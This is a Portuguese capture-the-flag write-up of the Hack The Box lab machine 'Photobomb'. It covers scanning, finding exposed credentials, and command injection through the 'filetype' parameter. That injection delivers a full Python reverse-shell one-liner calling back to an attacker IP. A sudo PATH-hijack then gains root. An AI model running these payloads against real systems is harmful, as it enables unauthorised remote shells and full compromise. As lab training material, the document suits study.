# Photobomb.md

Varredura com nmap
~~~py
nmap -sV -Pn -sC 10.10.11.182              
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-29 18:47 -03
Nmap scan report for 10.10.11.182
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
|_  256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.99 seconds
~~~

Parece que a porta 22/tcp e a porta 80/tcp estão abertas.

Como sempre, quando vemos um endereço da web, queremos adicioná-lo ao nosso arquivo **/etc/hosts**.

Vamos enumerar os diretórios utilizando a ferramenta dirsearch

~~~bash
dirsearch -u photobomb.htb

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /root/.dirsearch/reports/photobomb.htb_22-11-29_19-39-22.txt

Error Log: /root/.dirsearch/logs/errors-22-11-29_19-39-22.log

Target: http://photobomb.htb/

[19:39:23] Starting: 
[19:40:32] 200 -   11KB - /favicon.ico
[19:41:00] 401 -  590B  - /printer

Task Completed
~~~

Agora analisando o código fonte da página existe um arquivo .js que revele o seguinte
~~~js
http://pH0t0:b0Mb!@photobomb.htb/printer
~~~
Ao entrar nesse link fui conectado automaticamente como o usuario _pH0t0_. 

Parece que esta página pode ser usada para baixar imagens de vários tamanhos nos formatos de arquivo JPG ou PNG. Gostaria de saber se esta forma pode ser explorada?

Vamos tentar testar vulnerabilidades de injeção. No Burp Suite, na guia “Proxy”, abra o navegador proxy e navegue até [http://pH0t0:b0Mb!@photobomb.htb/printer](http://pH0t0:b0Mb!@photobomb.htb/printer)

Certifique-se de que o botão de interceptação esteja ativado, volte para o navegador proxy e baixe uma foto do site.  
  
De volta ao Burp Suite, você deve ver uma solicitação POST, que é basicamente uma solicitação solicitando o arquivo ao servidor. Encaminhe esta primeira solicitação, pois o servidor nos solicitará uma segunda solicitação que seja autenticada. Agora você deve ver a segunda solicitação POST, e esta é a que precisamos.

Vá para a aba “Repeater” no Burp, e você verá nossa solicitação lá. Como você pode ver, temos três parâmetros aqui que podemos testar para injeções. São eles: foto, tipo de arquivo e dimensões. Depois de manipular cada parâmetro, descobrimos que o parâmetro “filetype” pode ser vulnerável à injeção. Como você pode ver abaixo, alterar o valor de “filetype” para “jpg;ls” retorna um “500 Internal Server Error”. Um erro interno do servidor é uma pista de que pode haver uma vulnerabilidade de injeção de comando aqui.

Vamos tentar explorar isso criando um shell reverso e lançando-o por meio desse ponto de injeção:
~~~python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.87",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
~~~

Agora codifique o payload no modo URL dentro do Burp Suite e coloque o payload em _filetype=_ use um _;_ apos o _jpg_ e pronto, consegui a shell reversa.
Em /home/wizard é possivel localizar a flag de user.

----
Agora é necessario encontrar a flag de root.

Vamos executar sudo -l para ver o que podemos fazer como usuário “wizard”.

De nossa saída, você pode dizer que o usuário “wizard” é capaz de executar cleanup.sh como root. Além disso, “NOPASSWD” significa que isso pode ser feito sem uma senha.

Parece que o script pega o arquivo de log photobomb.log e o move para photobomb.log.old. Em seguida, usa truncar para excluir o conteúdo de photobomb.log.

Algo que notamos aqui é que o arquivo faz referência a outros arquivos, o que significa que podemos editar o $PATH para acessar outros arquivos:

~~~bash
echo bash > find
chmod +x find
sudo PATH=$PWD:$PATH /opt/cleanup.sh
~~~

apos isso vá até o arquivo root.txt e pegue a flag.

